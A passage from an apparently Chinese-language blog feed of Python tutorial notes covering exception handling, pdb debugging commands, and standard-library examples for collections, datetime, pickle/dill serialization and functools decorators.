<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>(<span class="title class_ inherited__">B</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>(<span class="title class_ inherited__">C</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">E</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cls <span class="keyword">in</span> [B, C, D, E]:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">raise</span> cls()</span><br><span class="line">    <span class="keyword">except</span> D <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">type</span>(e)=&#125;</span> <span class="subst">&#123;e.args&#125;</span>&quot;</span>) <span class="comment"># type(e)=&lt;class &#x27;__main__.D&#x27;&gt; ()</span></span><br><span class="line">    <span class="keyword">except</span> C:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;C&quot;</span>)                    <span class="comment"># C</span></span><br><span class="line">    <span class="keyword">except</span> B <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">type</span>(e)))  <span class="comment"># &lt;class &#x27;__main__.B&#x27;&gt;</span></span><br><span class="line">    <span class="keyword">except</span> BaseException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Unexpected <span class="subst">&#123;e=&#125;</span>, <span class="subst">&#123;<span class="built_in">type</span>(e)=&#125;</span>&quot;</span>)  <span class="comment"># TypeError: exceptions must derive from BaseException</span></span><br><span class="line">        <span class="keyword">raise</span>                                  <span class="comment"># 捕获后再次抛出此异常</span></span><br></pre></td></tr></table></figure>

<h2 id="raise…from"><a href="#raise…from" class="headerlink" title="raise…from"></a>raise…from</h2><ul>
<li>在<code>except</code>或<code>finally</code>块中，异常链是隐式自动指定的</li>
<li><code>raise...from</code>语句可以显式指定传播的异常链，常用于异常转换</li>
<li><code>raise...from None</code>语句可以禁用异常链</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">raise</span> ConnectionError</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    func()</span><br><span class="line"><span class="keyword">except</span> ConnectionError <span class="keyword">as</span> exc:</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;Failed to open database&#x27;</span>) <span class="keyword">from</span> exc</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;[Output]</span></span><br><span class="line"><span class="string">Traceback (most recent call last):</span></span><br><span class="line"><span class="string">  File &quot;&lt;stdin&gt;&quot;, line 2, in &lt;module&gt;</span></span><br><span class="line"><span class="string">  File &quot;&lt;stdin&gt;&quot;, line 2, in func</span></span><br><span class="line"><span class="string">ConnectionError</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The above exception was the direct cause of the following exception:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Traceback (most recent call last):</span></span><br><span class="line"><span class="string">  File &quot;&lt;stdin&gt;&quot;, line 4, in &lt;module&gt;</span></span><br><span class="line"><span class="string">RuntimeError: Failed to open database</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="try…except…else"><a href="#try…except…else" class="headerlink" title="try…except…else"></a>try…except…else</h2><ul>
<li>当try块没有引发异常(无论是否被捕获)时，执行else块，否则忽略else块</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> arg <span class="keyword">in</span> sys.argv[<span class="number">1</span>:]:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = <span class="built_in">open</span>(arg, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> OSError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;cannot open&#x27;</span>, arg)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(arg, <span class="string">&#x27;has&#x27;</span>, <span class="built_in">len</span>(f.readlines()), <span class="string">&#x27;lines&#x27;</span>)</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure>

<h2 id="try…finally"><a href="#try…finally" class="headerlink" title="try…finally"></a>try…finally</h2><ul>
<li>finally块一定会被执行</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def divide(x, y):</span><br><span class="line">    try:</span><br><span class="line">        result = x / y</span><br><span class="line">    except ZeroDivisionError:</span><br><span class="line">        print(&quot;division by zero!&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;result is&quot;, result)</span><br><span class="line">    finally:</span><br><span class="line">        print(&quot;executing finally clause&quot;)</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;[Output]</span><br><span class="line">&gt;&gt;&gt; divide(2, 1)</span><br><span class="line">result is 2.0</span><br><span class="line">executing finally clause</span><br><span class="line">&gt;&gt;&gt; divide(2, 0)</span><br><span class="line">division by zero!</span><br><span class="line">executing finally clause</span><br><span class="line">&gt;&gt;&gt; divide(&quot;2&quot;, &quot;1&quot;)</span><br><span class="line">executing finally clause</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>

<h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><ul>
<li>语法格式：<code>assert condition, error_message(optional)</code></li>
<li>assert失败时抛出<code>AssertionError</code>异常</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">1</span> == <span class="number">0</span>, <span class="string">&quot;abc&quot;</span></span><br><span class="line"><span class="keyword">except</span> AssertionError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e) <span class="comment"># abc</span></span><br></pre></td></tr></table></figure>

<h1 id="调试（Debugger）"><a href="#调试（Debugger）" class="headerlink" title="调试（Debugger）"></a>调试（Debugger）</h1><h2 id="进入"><a href="#进入" class="headerlink" title="进入"></a>进入</h2><ul>
<li>python3.7+引入内建函数<code>breakpoint()</code>自动使用pdb模块，且可通过<code>PYTHONBREAKPOINT</code>环境变量控制调试器行为。</li>
</ul>
<div class="tabs" id="debugger"><ul class="nav-tabs"><li class="tab active"><a href="#debugger-1">pdb</a></li><li class="tab"><a href="#debugger-2">breakpoint</a></li><li class="tab"><a href="#debugger-3">cmdline</a></li></ul><div class="tab-content"><div class="tab-pane active" id="debugger-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ cat test.py</span><br><span class="line">filename = __file__</span><br><span class="line"><span class="keyword">import</span> pdb; pdb.set_trace()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;path = <span class="subst">&#123;filename&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">$ python test.py</span><br><span class="line">&gt; /opt/python3/sample/test.py(<span class="number">5</span>)&lt;module&gt;()</span><br><span class="line">-&gt; <span class="built_in">print</span>(<span class="string">f&#x27;path = <span class="subst">&#123;filename&#125;</span>&#x27;</span>)</span><br><span class="line">(Pdb) filename</span><br><span class="line"><span class="string">&#x27;test.py&#x27;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="debugger-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ cat test.py</span><br><span class="line">filename = __file__</span><br><span class="line"><span class="built_in">breakpoint</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;path = <span class="subst">&#123;filename&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">$ python test.py</span><br><span class="line">&gt; /opt/python3/sample/test.py(<span class="number">5</span>)&lt;module&gt;()</span><br><span class="line">-&gt; <span class="built_in">print</span>(<span class="string">f&#x27;path = <span class="subst">&#123;filename&#125;</span>&#x27;</span>)</span><br><span class="line">(Pdb) filename</span><br><span class="line"><span class="string">&#x27;test.py&#x27;</span></span><br><span class="line"></span><br><span class="line">$ PYTHONBREAKPOINT=<span class="number">0</span> python test.py</span><br><span class="line">path = test.py</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="debugger-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ cat test.py</span><br><span class="line">filename = __file__</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;path = <span class="subst">&#123;filename&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">$ python -m pdb test.py</span><br><span class="line">&gt; /opt/python3/sample/test.py(<span class="number">1</span>)&lt;module&gt;()</span><br><span class="line">-&gt; filename = __file__</span><br><span class="line">(Pdb) <span class="built_in">next</span></span><br><span class="line">&gt; /opt/python3/sample/test.py(<span class="number">2</span>)&lt;module&gt;()</span><br><span class="line">-&gt; <span class="built_in">print</span>(<span class="string">f&#x27;path = <span class="subst">&#123;filename&#125;</span>&#x27;</span>)</span><br><span class="line">(Pdb) p filename</span><br><span class="line"><span class="string">&#x27;test.py&#x27;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(Pdb) l               (list)列出源码（默认11行，&#x27;.&#x27;参数一直从当前位置开始）</span><br><span class="line">(Pdb) ll              (longlist)列出源码（当前函数或frame）</span><br><span class="line">(Pdb) a               (args)打印参数</span><br><span class="line">(Pdb) p &lt;v1&gt;, &lt;v2&gt;    (p)打印表达式的值</span><br><span class="line">(Pdb) pp &#x27;v1=&#x27; + v1   (pp)打印表达式的值（Pretty-print）</span><br><span class="line">(Pdb) display &lt;v1&gt;    (display)自动打印变量值（当变量值改变时）</span><br><span class="line">(Pdb) undisplay &lt;v1&gt;  (undisplay)取消自动打印变量值（当变量值改变时）</span><br><span class="line">(Pdb) n               (next)执行一行（step over）</span><br><span class="line">(Pdb) s               (step)执行一行（step into）</span><br><span class="line">(Pdb) c               (continue)继续执行（直到遇到断点）</span><br><span class="line">(Pdb) unt             (until)继续执行（直到行号大于当前行，用于跳出循环）</span><br><span class="line">(Pdb) b util:5        (break)设置断点（util.py文件第5行）</span><br><span class="line">(Pdb) b util.get_path (break)设置断点（util模块的get_path函数入口）</span><br><span class="line">(Pdb) b               (break)查看断点（序号Num）</span><br><span class="line">(Pdb) disable 1       (disable)禁用断点（序号Num）</span><br><span class="line">(Pdb) enable 1        (enable)启用断点（序号Num）</span><br><span class="line">(Pdb) cl 1            (clear)删除断点（序号Num）</span><br><span class="line">(Pdb) cl util:5       (clear)删除断点</span><br><span class="line">(Pdb) w               (bt)打印栈回溯（stack trace）</span><br><span class="line">(Pdb) u               (up)向上移动frame（2参数移动2个frame）</span><br><span class="line">(Pdb) d               (down)向下移动frame</span><br><span class="line">(Pdb) h w             (help)打印帮助（w命令）</span><br><span class="line">(Pdb) q               (quit)退出</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="https://docs.python.org/3/tutorial/">The Python Tutorial</a><br>[2] <a href="https://www.python.org/dev/peps/">Index of Python Enhancement Proposals (PEPs)</a><br>[3] <a href="https://www.geeksforgeeks.org/method-resolution-order-in-python-inheritance/">Method resolution order in Python Inheritance</a><br>[4] <a href="https://github.com/taizilongxu/interview_python">taizilongxu&#x2F;interview_python</a></p>
]]></content>
      <categories>
        <category>ProgrammingLanguage</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python标准库</title>
    <url>/ProgrammingLanguage/Python/StandardLibrary.html</url>
    <content><![CDATA[<p><a href="https://docs.python.org/3/library/index.html">The Python Standard Library</a></p>
<span id="more"></span>

<h1 id="数据类型（Data-Types"><a href="#数据类型（Data-Types" class="headerlink" title="数据类型（Data Types)"></a>数据类型（Data Types)</h1><h2 id="collections-container"><a href="#collections-container" class="headerlink" title="collections (container)"></a>collections (container)</h2><h3 id="ChainMap"><a href="#ChainMap" class="headerlink" title="ChainMap"></a>ChainMap</h3><ul>
<li>类似于字典，可将多个字典聚合在一起后统一处理</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> collections.ChainMap(&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>&#125;, &#123;<span class="string">&#x27;c&#x27;</span>: <span class="number">3</span>&#125;).items():</span><br><span class="line">    <span class="built_in">print</span>(item) <span class="comment"># (&#x27;c&#x27;, 3) / (&#x27;a&#x27;, 1) / (&#x27;b&#x27;, 2)</span></span><br></pre></td></tr></table></figure>

<h3 id="deque"><a href="#deque" class="headerlink" title="deque"></a>deque</h3><ul>
<li>类似于list，可快速在两端append和pop</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"></span><br><span class="line"><span class="comment"># create</span></span><br><span class="line">D = deque(<span class="string">&#x27;abc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># access</span></span><br><span class="line"><span class="built_in">print</span>(D[<span class="number">0</span>], D[-<span class="number">1</span>])            <span class="comment"># a c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># iterate</span></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> D:</span><br><span class="line">    <span class="built_in">print</span>(e) <span class="comment"># a b c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># append</span></span><br><span class="line">D.append(<span class="string">&#x27;d&#x27;</span>); <span class="built_in">print</span>(D)       <span class="comment"># deque([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;])</span></span><br><span class="line">D.appendleft(<span class="string">&#x27;3&#x27;</span>); <span class="built_in">print</span>(D)   <span class="comment"># deque([&#x27;3&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;])</span></span><br><span class="line">D.extendleft(<span class="string">&#x27;21&#x27;</span>); <span class="built_in">print</span>(D)  <span class="comment"># deque([&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># remove</span></span><br><span class="line">e = D.pop(); <span class="built_in">print</span>(D, e)      <span class="comment"># deque([&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]) d</span></span><br><span class="line">e = D.popleft(); <span class="built_in">print</span>(D, e)  <span class="comment"># deque([&#x27;2&#x27;, &#x27;3&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]) 1</span></span><br><span class="line">e = D.popleft(); <span class="built_in">print</span>(D, e)  <span class="comment"># deque([&#x27;3&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]) 2</span></span><br><span class="line">e = D.popleft(); <span class="built_in">print</span>(D, e)  <span class="comment"># deque([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]) 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># convert to list</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(D))                <span class="comment"># [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">reversed</span>(D)))      <span class="comment"># [&#x27;c&#x27;, &#x27;b&#x27;, &#x27;a&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># search</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c&#x27;</span> <span class="keyword">in</span> D)               <span class="comment"># True</span></span><br><span class="line">D.extend(<span class="string">&#x27;de&#x27;</span>); <span class="built_in">print</span>(D)      <span class="comment"># deque([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rotation</span></span><br><span class="line">D.rotate(<span class="number">2</span>); <span class="built_in">print</span>(D)         <span class="comment"># deque([&#x27;d&#x27;, &#x27;e&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;])</span></span><br><span class="line">D.rotate(-<span class="number">2</span>); <span class="built_in">print</span>(D)        <span class="comment"># deque([&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># copy</span></span><br><span class="line">E = deque(<span class="built_in">reversed</span>(D)); <span class="built_in">print</span>(E) <span class="comment"># deque([&#x27;e&#x27;, &#x27;d&#x27;, &#x27;c&#x27;, &#x27;b&#x27;, &#x27;a&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># clear</span></span><br><span class="line">D.clear(); <span class="built_in">print</span>(D)           <span class="comment"># deque([])</span></span><br></pre></td></tr></table></figure>

<h2 id="datetime-date-and-time"><a href="#datetime-date-and-time" class="headerlink" title="datetime (date and time)"></a>datetime (date and time)</h2><h3 id="fromtimestamp"><a href="#fromtimestamp" class="headerlink" title="fromtimestamp"></a>fromtimestamp</h3><ul>
<li>fromtimestamp返回POSIX时间戳对应的日期和时间</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">dt = datetime.fromtimestamp(time.time())</span><br><span class="line">ss = dt.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(dt), ss) <span class="comment"># &lt;class &#x27;datetime.datetime&#x27;&gt; 2021-11-15 17:12:54</span></span><br></pre></td></tr></table></figure>

<h3 id="timedelta"><a href="#timedelta" class="headerlink" title="timedelta"></a>timedelta</h3><ul>
<li>timedelta对象表示duration，即两个日期或时间之间的差值</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">t = time.strptime(<span class="string">&#x27;01:00&#x27;</span>, <span class="string">&#x27;%M:%S&#x27;</span>)</span><br><span class="line">s = datetime.timedelta(minutes=t.tm_min, seconds=t.tm_sec).total_seconds()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(t), <span class="built_in">type</span>(s), s)   <span class="comment"># &lt;class &#x27;time.struct_time&#x27;&gt; &lt;class &#x27;float&#x27;&gt; 60.0</span></span><br></pre></td></tr></table></figure>

<h1 id="数据持久化（Data-Persistence）"><a href="#数据持久化（Data-Persistence）" class="headerlink" title="数据持久化（Data Persistence）"></a>数据持久化（Data Persistence）</h1><h2 id="marshal-internal-object-serialization"><a href="#marshal-internal-object-serialization" class="headerlink" title="marshal (internal object serialization)"></a>marshal (internal object serialization)</h2><ul>
<li>被解释器使用，用于序列化字节码（<code>.pyc</code>文件），术语编排（marshalling）与反编排（unmarshalling）</li>
</ul>
<h2 id="pickle-object-serialization"><a href="#pickle-object-serialization" class="headerlink" title="pickle (object serialization)"></a>pickle (object serialization)</h2><ul>
<li>二进制形式序列化对象，术语pickling和unpickling</li>
<li>协议版本随python版本变化，一般新版本包含更多特性，因此unpickling在老版本不适用</li>
<li>存在Unpicklable的类型：<ul>
<li>包含lambda函数</li>
</ul>
</li>
<li>第三方库dill可以扩展pickle的能力，甚至能处理整个解释器会话上（dump_session&#x2F;load_session），但仍存在不支持的类型：<ul>
<li>包含数据库连接对象</li>
</ul>
</li>
<li>通过<code>__getstate__()</code>可在pickle过程中排除掉一些成员变量</li>
<li>通过<code>__setstate__()</code>可在unpickling过程做些额外的初始化</li>
</ul>
<div class="tabs" id="data-persist-pickle"><ul class="nav-tabs"><li class="tab active"><a href="#data-persist-pickle-1">pickle</a></li><li class="tab"><a href="#data-persist-pickle-2">dill</a></li><li class="tab"><a href="#data-persist-pickle-3">__getstate__()&__setstate__()</a></li></ul><div class="tab-content"><div class="tab-pane active" id="data-persist-pickle-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Example</span>:</span><br><span class="line">    a_number = <span class="number">35</span></span><br><span class="line">    a_string = <span class="string">&quot;hey&quot;</span></span><br><span class="line">    a_list = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">    a_dict = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>, <span class="string">&quot;b&quot;</span>: [<span class="number">2</span>]&#125;</span><br><span class="line">    a_tuple = (<span class="number">22</span>, <span class="number">23</span>)</span><br><span class="line"></span><br><span class="line">e = Example()</span><br><span class="line">e_pickled = pickle.dumps(e)            <span class="comment"># Pickling</span></span><br><span class="line">e_unpickled = pickle.loads(e_pickled)  <span class="comment"># Unpickling</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;pickle.HIGHEST_PROTOCOL&#125;</span> <span class="subst">&#123;pickle.DEFAULT_PROTOCOL&#125;</span>&quot;</span>) <span class="comment"># 5 4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e_pickled&#125;</span>&quot;</span>) <span class="comment"># b&#x27;\x80\x04\x95\x1b\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x07Example\x94\x93\x94)\x81\x94.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e_unpickled.a_dict&#125;</span>&quot;</span>) <span class="comment"># &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: [2]&#125;</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="data-persist-pickle-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> dill</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> x: x * x</span><br><span class="line">s_pickled = dill.dumps(s)</span><br><span class="line">s_unpickled = dill.loads(s_pickled)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;s_pickled&#125;</span>&quot;</span>) <span class="comment"># b&#x27;\x80\x04\x95\xbb\x00\x00\x00\x00\x00\x00\x00\x8c\ndill._dill\x94\x8c\x10_create_function\x94\x93\x94(h\x00\x8c\x0c_create_code\x94\x93\x94(K\x01K\x00K\x00K\x01K\x02KCC\x08|\x00|\x00\x14\x00S\x00\x94N\x85\x94)\x8c\x01x\x94\x85\x94\x8c(/opt/python3/sample/core/pickle/basic.py\x94\x8c\x08&lt;lambda&gt;\x94K\x14C\x00\x94))t\x94R\x94c__builtin__\n__main__\nh\nNN&#125;\x94Nt\x94R\x94.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;s_unpickled(<span class="number">3</span>)&#125;</span>&quot;</span>) <span class="comment"># 9</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="data-persist-pickle-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foobar</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">35</span></span><br><span class="line">        self.b = <span class="string">&quot;test&quot;</span></span><br><span class="line">        self.c = <span class="keyword">lambda</span> x: x * x</span><br><span class="line"></span><br><span class="line">    <span class="comment"># To specify what you want to pickle</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">        attributes = self.__dict__.copy()</span><br><span class="line">        <span class="keyword">del</span> attributes[<span class="string">&#x27;c&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> attributes</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Do additional initializations while unpickling</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, state</span>):</span><br><span class="line">        self.__dict__ = state</span><br><span class="line">        self.c = <span class="keyword">lambda</span> x: x * x</span><br><span class="line"></span><br><span class="line">f = Foobar()</span><br><span class="line">f_pickled = pickle.dumps(f)           <span class="comment"># filter by __getstate__()</span></span><br><span class="line">f_unpickled = pickle.loads(f_pickled) <span class="comment"># filter by __setstate__()</span></span><br><span class="line"><span class="built_in">print</span>(f_unpickled.__dict__) <span class="comment"># &#123;&#x27;a&#x27;: 35, &#x27;b&#x27;: &#x27;test&#x27;, &#x27;c&#x27;: &lt;function Foobar.__setstate__.&lt;locals&gt;.&lt;lambda&gt; at 0x7fed7f771d30&gt;&#125;</span></span><br></pre></td></tr></table></figure></div></div></div>

<h1 id="函数式编程（Functional-Programming）"><a href="#函数式编程（Functional-Programming）" class="headerlink" title="函数式编程（Functional Programming）"></a>函数式编程（Functional Programming）</h1><h2 id="functools-higher-order-function"><a href="#functools-higher-order-function" class="headerlink" title="functools (higher-order function)"></a>functools (higher-order function)</h2><div class="tabs" id="functools"><ul class="nav-tabs"><li class="tab active"><a href="#functools-1">basic</a></li><li class="tab"><a href="#functools-2">asMethod</a></li><li class="tab"><a href="#functools-3">withParameter</a></li></ul><div class="tab-content"><div class="tab-pane active" id="functools-1"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decorator_auto</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;A wrapper function&quot;&quot;&quot;</span></span><br><span class="line">        func()</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decorator_manual</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;A wrapper function&quot;&quot;&quot;</span></span><br><span class="line">        func()</span><br><span class="line">    wrapper.__name__ = func.__name__</span><br><span class="line">    wrapper.__doc__ = func.__doc__</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@decorator_manual</span></span><br><span class="line"><span class="comment">#@decorator_auto</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">doing</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;A doing function&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;doing function&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(doing.__name__)</span><br><span class="line"><span class="built_in">print</span>(doing.__doc__)</span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="functools-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decorator_auto</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;A wrapper function&quot;&quot;&quot;</span></span><br><span class="line">        func()</span><br><span class="line">        <span class="built_in">print</span>(self.__dict__) <span class="comment"># &#123;&#x27;a&#x27;: 1&#125;</span></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @decorator_auto</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">doing</span>():</span><br><span class="line">        <span class="string">&quot;&quot;&quot;A doing function&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;doing function&quot;</span>)</span><br><span class="line"></span><br><span class="line">T = Test()</span><br><span class="line"><span class="built_in">print</span>(T.doing.__name__)  <span class="comment"># doing</span></span><br><span class="line"><span class="built_in">print</span>(T.doing.__doc__)   <span class="comment"># A doing function</span></span><br><span class="line"><span class="built_in">print</span>(T.doing())         <span class="comment"># None</span></span><br></pre></td></tr></table></figure></div><div class="tab-pane" id="functools-3"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decorator_auto</span>(<span 